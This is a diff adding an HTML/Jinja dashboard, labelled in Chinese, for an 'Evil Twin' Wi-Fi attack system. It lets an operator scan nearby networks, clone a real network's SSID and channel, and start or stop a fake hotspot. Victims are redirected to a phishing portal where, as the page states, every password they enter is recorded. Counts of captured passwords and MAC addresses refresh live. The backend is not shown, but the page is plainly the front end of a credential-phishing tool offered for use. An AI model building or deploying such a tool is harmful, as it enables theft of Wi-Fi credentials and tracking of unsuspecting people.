@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil Twin 管理系统</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        h1 { text-align: center; margin-bottom: 30px; color: #0f3460; text-shadow: 0 0 10px #e94560; }
+        .dashboard { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .card { background: #16213e; border-radius: 10px; padding: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .card h2 { margin-bottom: 15px; color: #e94560; border-left: 3px solid #e94560; padding-left: 10px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group small { display: block; color: #4ecdc4; font-size: 11px; margin-top: 3px; }
+        label { display: block; margin-bottom: 5px; color: #aaa; }
+        input, select { width: 100%; padding: 10px; background: #0f3460; border: none; border-radius: 5px; color: #fff; font-size: 14px; }
+        button { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 14px; margin-right: 10px; transition: all 0.3s; }
+        button:hover { background: #ff6b6b; transform: scale(1.02); }
+        .btn-danger { background: #dc3545; }
+        .btn-success { background: #28a745; }
+        .status { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; }
+        .status-running { background: #28a745; box-shadow: 0 0 5px #28a745; }
+        .status-stopped { background: #dc3545; }
+        .stats { display: flex; justify-content: space-around; text-align: center; margin-top: 15px; }
+        .stat-number { font-size: 2em; font-weight: bold; color: #e94560; }
+        .stat-label { color: #888; font-size: 12px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #0f3460; }
+        th { color: #e94560; }
+        .nav-links { display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }
+        .nav-links a { color: #fff; text-decoration: none; padding: 8px 16px; background: #0f3460; border-radius: 5px; }
+        .nav-links a:hover { background: #e94560; }
+        .alert { padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; }
+        .alert-success { background: #28a74520; border: 1px solid #28a745; color: #28a745; }
+        .alert-error { background: #dc354520; border: 1px solid #dc3545; color: #dc3545; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1> Evil Twin 攻击管理系统</h1>
+        <div class="nav-links">
+            <a href="/"> 首页</a>
+            <a href="/passwords"> 密码记录 ({{ password_count }}/10)</a>
+            <a href="/macs">️ MAC地址记录</a>
+        </div>
+        <div id="alert" class="alert"></div>
+        <div class="dashboard">
+            <div class="card">
+                <h2>⚙️ 热点配置</h2>
+                <div class="form-group">
+                    <label>伪造WiFi SSID名称</label>
+                    <input type="text" id="evil_ssid" value="{{ config.evil_ssid }}" placeholder="例如: Free_WiFi">
+                </div>
+                <div class="form-group">
+                    <label>工作信道</label>
+                    <select id="evil_channel">
+                        {% for ch in [1,2,3,4,5,6,7,8,9,10,11] %}
+                        <option value="{{ ch }}" {% if config.evil_channel == ch %}selected{% endif %}>{{ ch }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>无线网卡接口名 <small id="iface_hint">自动检测中...</small></label>
+                    <input type="text" id="network_interface" list="iface_list" value="{{ config.network_interface }}" placeholder="例如: wlan0">
+                    <datalist id="iface_list"></datalist>
+                </div>
+                <button onclick="saveConfig()"> 保存配置</button>
+            </div>
+            <div class="card">
+                <h2> 攻击控制</h2>
+                <div id="status_indicator">
+                    <span class="status status-stopped" id="status_light"></span>
+                    <span id="status_text">未运行</span>
+                </div>
+                <div style="margin-top: 15px;">
+                    <button class="btn-success" onclick="startAttack()">▶ 启动攻击</button>
+                    <button class="btn-danger" onclick="stopAttack()">⏹️ 停止攻击</button>
+                </div>
+                <div class="stats">
+                    <div>
+                        <div class="stat-number" id="password_count">{{ password_count }}</div>
+                        <div class="stat-label">捕获密码</div>
+                    </div>
+                    <div>
+                        <div class="stat-number" id="mac_count">{{ mac_count }}</div>
+                        <div class="stat-label">捕获MAC</div>
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <h2> 钓鱼入口</h2>
+                <p>用户连接后访问任意网站将被重定向到:</p>
+                <code style="background:#0f3460; display:block; padding:10px; border-radius:5px; margin:10px 0;">
+                    http://192.168.4.1/portal
+                </code>
+                <p style="font-size:12px; color:#888;">※ 用户输入的任何密码都会被记录</p>
+            </div>
+            <div class="card">
+                <h2>📡 周围 WiFi 扫描</h2>
+                <button onclick="scanWiFi()" id="scan_btn">🔍 开始扫描</button>
+                <span id="scan_status" style="font-size:12px; color:#888; margin-left:10px;"></span>
+                <table id="scan_table" style="display:none; margin-top:10px;">
+                    <thead>
+                        <tr><th>SSID</th><th>信号</th><th>信道</th><th>加密</th><th>操作</th></tr>
+                    </thead>
+                    <tbody id="scan_body"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    <script>
+        function showAlert(message, type) {
+            const alert = document.getElementById('alert');
+            alert.className = 'alert alert-'+type;
+            alert.innerHTML = message;
+            alert.style.display = 'block';
+            setTimeout(function(){ alert.style.display = 'none'; }, 3000);
+        }
+        async function saveConfig() {
+            var evil_ssid = document.getElementById('evil_ssid').value;
+            var evil_channel = parseInt(document.getElementById('evil_channel').value);
+            var network_interface = document.getElementById('network_interface').value.trim() || 'wlan0';
+            var response = await fetch('/api/config', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ evil_ssid: evil_ssid, evil_channel: evil_channel, network_interface: network_interface })
+            });
+            var data = await response.json();
+            if (data.status === 'success') {
+                showAlert('配置已保存，热点将自动重启', 'success');
+            } else {
+                showAlert('保存失败', 'error');
+            }
+        }
+        async function startAttack() {
+            var response = await fetch('/api/start', { method: 'POST' });
+            var data = await response.json();
+            if (data.status === 'success') {
+                showAlert(data.message, 'success');
+                updateStatus();
+            } else {
+                showAlert('启动失败', 'error');
+            }
+        }
+        async function stopAttack() {
+            var response = await fetch('/api/stop', { method: 'POST' });
+            var data = await response.json();
+            showAlert(data.message, 'success');
+            updateStatus();
+        }
+        async function detectInterfaces() {
+            try {
+                var r = await fetch('/api/interfaces');
+                var ifaces = await r.json();
+                var list = document.getElementById('iface_list');
+                var input = document.getElementById('network_interface');
+                var hint = document.getElementById('iface_hint');
+                list.innerHTML = '';
+                ifaces.forEach(function(name) {
+                    var opt = document.createElement('option');
+                    opt.value = name;
+                    list.appendChild(opt);
+                });
+                if (ifaces.length > 0) {
+                    hint.textContent = '已检测到 ' + ifaces.length + ' 个无线网卡';
+                    if (!ifaces.includes(input.value)) {
+                        input.value = ifaces[0];
+                    }
+                } else {
+                    hint.textContent = '未检测到无线网卡，请手动输入';
+                }
+            } catch(e) {
+                document.getElementById('iface_hint').textContent = '检测失败，请手动输入';
+            }
+        }
+        async function scanWiFi() {
+            var btn = document.getElementById('scan_btn');
+            var status = document.getElementById('scan_status');
+            var table = document.getElementById('scan_table');
+            var tbody = document.getElementById('scan_body');
+            btn.disabled = true;
+            btn.textContent = '⏳ 扫描中...';
+            status.textContent = '扫描需要 3-8 秒';
+            try {
+                var r = await fetch('/api/scan', { method: 'POST' });
+                var data = await r.json();
+                btn.disabled = false;
+                btn.textContent = '🔍 开始扫描';
+                if (data.status === 'success') {
+                    status.textContent = '发现 ' + data.count + ' 个 WiFi';
+                    table.style.display = 'block';
+                    tbody.innerHTML = '';
+                    data.results.forEach(function(ap) {
+                        var row = tbody.insertRow();
+                        var signalIcon = ap.signal > -50 ? '🟢' : (ap.signal > -70 ? '🟡' : '🔴');
+                        row.insertCell(0).innerHTML = '<b>' + ap.ssid + '</b><br><small style="color:#888">' + ap.bssid + '</small>';
+                        row.insertCell(1).innerHTML = signalIcon + ' ' + ap.signal + ' dBm';
+                        row.insertCell(2).innerText = ap.channel || '?';
+                        row.insertCell(3).innerText = ap.security;
+                        var actionCell = row.insertCell(4);
+                        var cloneBtn = document.createElement('button');
+                        cloneBtn.textContent = '🎯 克隆';
+                        cloneBtn.style.padding = '5px 10px';
+                        cloneBtn.style.fontSize = '12px';
+                        cloneBtn.onclick = function() {
+                            cloneAp(ap.ssid, ap.channel);
+                        };
+                        actionCell.appendChild(cloneBtn);
+                    });
+                } else {
+                    status.textContent = '扫描失败: ' + data.message;
+                }
+            } catch(e) {
+                btn.disabled = false;
+                btn.textContent = '🔍 开始扫描';
+                status.textContent = '网络错误';
+            }
+        }
+        function cloneAp(ssid, channel) {
+            document.getElementById('evil_ssid').value = ssid;
+            document.getElementById('evil_channel').value = channel;
+            showAlert('已填入 SSID: ' + ssid + '  信道: ' + channel + '，请点击保存配置', 'success');
+        }
+        async function updateStatus() {
+            var response = await fetch('/api/status');
+            var data = await response.json();
+            var light = document.getElementById('status_light');
+            var text = document.getElementById('status_text');
+            if (data.hostapd) {
+                light.className = 'status status-running';
+                text.innerText = '运行中';
+            } else {
+                light.className = 'status status-stopped';
+                text.innerText = '未运行';
+            }
+        }
+        setInterval(updateStatus, 5000);
+        setInterval(async function() {
+            var response = await fetch('/api/passwords');
+            var passwords = await response.json();
+            document.getElementById('password_count').innerText = passwords.length;
+            var macResp = await fetch('/api/macs');
+            var macs = await macResp.json();
+            document.getElementById('mac_count').innerText = macs.length;
+        }, 3000);
+        detectInterfaces();
+        updateStatus();
+    </script>
+</body>
+</html>
